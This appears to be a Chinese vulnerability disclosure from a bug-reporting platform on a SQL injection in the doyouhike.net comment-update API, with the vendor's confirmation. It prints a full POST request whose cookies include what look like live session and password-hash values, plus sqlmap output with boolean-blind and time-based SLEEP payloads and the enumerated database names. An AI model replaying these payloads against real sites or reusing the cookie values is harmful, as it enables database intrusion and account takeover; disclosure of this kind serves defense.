wybug_title: 磨房网SQL注入八（5库涉及百万用户数据）
wybug_author: 天地不仁 以万物为刍狗
wybug_detail:
漏洞详情 披露状态：   									2015-12-29：	细节已通知厂商并且等待厂商处理中									2015-12-30：	厂商已经确认，细节仅向厂商公开									2016-01-09：	细节向核心白帽子及相关领域专家公开									2016-01-19：	细节向普通白帽子公开									2016-01-29：	细节向实习白帽子公开									2016-02-12：	细节向公众公开  简要描述： ········ 详细说明：  POST数据包：
POST /api/reviews/update_comment HTTP/1.1Host: www.doyouhike.netContent-Length: 76Accept: application/json, text/javascript, */*; q=0.01Origin: http://www.doyouhike.netX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 UBrowser/5.5.7852.203 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://www.doyouhike.net/dest/guangzhouyingguxian-hikingAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: pgv_pvi=8593548288; PHPSESSID=g498gfeuatnq9p2af5uo30ljo2; dyh_userid=3009909; dyh_password=118c3ec5e8b073f978fc0b4d45e601c5; __utmt=1; addroute_return_url=http%3A%2F%2Fwww.doyouhike.net%2Fdest%2Fguangzhouyingguxian-hiking; dyh_lastactivity=1451378189; __utma=151782572.1166654032.1451292000.1451357909.1451371223.8; __utmb=151782572.75.10.1451371223; __utmc=151782572; __utmz=151782572.1451292000.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)short_desc=11111111111111111111111&star_level=5&comment_id=2967*&src_qd=route
参数 comment_id 可注入

这里就不跑了  按照之前的数据库····

   漏洞证明：  
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection point(s) with a total of 101 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: short_desc=11111111111111111111111&star_level=5&comment_id=2967 AND 1576=1576&src_qd=route    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: short_desc=11111111111111111111111&star_level=5&comment_id=2967 AND (SELECT * FROM (SELECT(SLEEP(5)))VeVZ)&src_qd=route---[16:42:04] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12[16:42:04] [INFO] fetching database names[16:42:04] [INFO] fetching number of databases[16:42:04] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[16:42:04] [INFO] retrieved: 5[16:42:07] [INFO] retrieved: information_schema[16:42:31] [INFO] retrieved: bizrc[16:42:39] [INFO] retrieved: click[16:42:45] [INFO] retrieved: g3rc[16:42:52] [INFO] retrieved: sphinxavailable databases [5]:[*] bizrc[*] click[*] g3rc[*] information_schema[*] sphinx[16:43:09] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 210 times[16:43:09] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\www.doyouhike.net'[*] shutting down at 16:43:09

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-30 10:54 厂商回复： 漏洞已确认，感谢作者 最新状态： 暂无
